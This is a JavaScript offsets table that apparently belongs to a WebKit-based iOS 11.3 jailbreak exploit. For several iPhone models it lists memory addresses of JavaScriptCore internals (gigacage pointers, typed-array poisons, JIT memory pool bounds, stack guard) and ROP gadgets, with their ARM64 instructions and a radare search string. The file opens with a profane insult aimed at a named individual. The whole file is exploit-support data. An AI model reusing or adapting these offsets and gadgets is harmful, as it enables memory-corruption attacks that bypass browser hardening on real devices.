//Fuck off Joseph Shenton and other copycats (Except for coolstar and luca todesco, they are free to copy).
var Offsets = function Offsets(sw_vers, productname) {
    
    var offsets = [];
    
    offsets["iPhone 2G"] = [];
    offsets["iPhone 3G"] = [];
    offsets["iPhone 3GS"] = [];
    offsets["iPhone 4"] = [];
    offsets["iPhone 4S"] = [];
    offsets["iPhone 5"] = [];
    offsets["iPhone 5C"] = [];
    offsets["iPhone 5S"] = [];
    offsets["iPhone 6"] = [];
    offsets["iPhone 6+"] = [];
    offsets["iPhone 6S"] = [];
    offsets["iPhone 6S+"] = [];
    offsets["iPhone 7"] = [];
    offsets["iPhone 7+"] = [];
    offsets["iPhone 8"] = [];
    offsets["iPhone 8+"] = [];
    offsets["iPhone X"] = [];
    
    offsets["iPhone 6S"][11.31] = {
        padding: 0x18, //For JIT Hardening
        vtable: 0, //From JSCore
        disableprimitivegigacage: 0x18851a7d4,
        callbacks: 0x1b3247d28, //From JSCore (might be incorrect)
        g_gigacagebaseptrs: 0x1b1bf4000, //From JSCore
        g_typedarraypoisons: 0x1b31a1720, //From JSCore
        longjmp: 0x180b126e8, //From JSCore (might be incorrect)
        dlsym: 0x18851d090,  //From JSCore
        startfixedmempool: 0x1b31a10b8, //From JSCore
        endfixedmempool: 0x1b31a10c0, //From JSCore
        jit_writeseperateheaps_func: 0x1b31a10c8, //From JSCore
        usefastpermissions_jitcopy: 0x1b1bf0018, //From JSCore (JIT hardening)
        ptr_stack_check_guard: 0x1ac2f7c40, //From JSCore
        modelio_popx8: 0x18d2f6574, //From ModelIO
                                    //   ldr x8, [sp, #0x28]
                                    //   ldr x0, [x8, #0x18]
                                    //   ldp x29, x30, [sp, #0x50]
                                    //   add sp, sp, #0x60
                                    //   ret
        coreaudio_popx2: 0x18409ddcc,   //From CoreAudio
                                        //   ldr x2, [sp, #8]
                                        //   mov x0, x2
                                        //   ldp x29, x30, [sp, #0x10]
                                        //   add sp, sp, #0x20
                                        //   ret
        linkcode_gadget: 0  //See jitcode.s (stage 2)
    };
    
    offsets["iPhone 8"][11.31] = {
        padding: 0x20, //For JIT Hardening
        vtable: 0x189c9a808, //From Webkit
        disableprimitivegigacage: 0x18851a7d4,
        callbacks: 0x1b335bd28, //From Webkit
        g_gigacagebaseptrs: 0x1b1d08000, //From Webkit
        g_typedarraypoisons: 0x1b335d720, //From Webkit
        longjmp: 0x180b126e8, //From CoreFoundation
        dlsym: 0x18084ef90,  //From CoreFoundation
        startfixedmempool: 0x1b335d0b8, //From Webkit
        endfixedmempool: 0x1b335d0c0, //From Webkit
        jit_writeseperateheaps_func: 0x1b335d0c8, //From Webkit
        usefastpermissions_jitcopy: 0x1b1d04018, //From Webkit (JIT hardening)
        ptr_stack_check_guard: 0x1ac3efc40, //From Webkit
        modelio_popx8: 0x18d2f6564, //Use radare: "/c ldr x8, [sp, 0x28]; ldr x0, [x8, 0x18]; ldp x29, x30, [sp, 0x50]; add sp, sp, 0x60; ret"
        coreaudio_popx2: 0x18409ddbc,   //From CoreAudio
                                        //   ldr x2, [sp, #8]
                                        //   mov x0, x2
                                        //   ldp x29, x30, [sp, #0x10]
                                        //   add sp, sp, #0x20
                                        //   ret
        linkcode_gadget: 0x187bd18c8 //See jitcode.s (stage 2)
    };
    
    offsets["iPhone X"][11.31] = { //soon
        padding: 0x20, //For JIT Hardening
        vtable: 0, //From Webkit
        disableprimitivegigacage: 0x18851a7d4,
        g_gigacagebaseptrs: 0x1b1cb0000, //From Webkit
        g_typedarraypoisons: 0x1b3281720, //From Webkit
        startfixedmempool: 0x1b32810b8, //From Webkit
        endfixedmempool: 0x1b32810c0, //From Webkit
    };
    
    offsets["iPhone 8"][11.3] = offsets["iPhone 8"][11.31];
    offsets["iPhone 8+"][11.3] = offsets["iPhone 8"][11.31];
    //offsets["iPhone X"][11.3] = offsets["iPhone 8"][11.31];
    offsets["iPhone 8+"][11.31] = offsets["iPhone 8"][11.31];
    //offsets["iPhone X"][11.31] = offsets["iPhone 8"][11.31];
    
    if(offsets[productname] !== undefined) {
        if(offsets[productname][sw_vers] !== undefined) {
            return offsets[productname][sw_vers];
        }
    }
    return false;
};
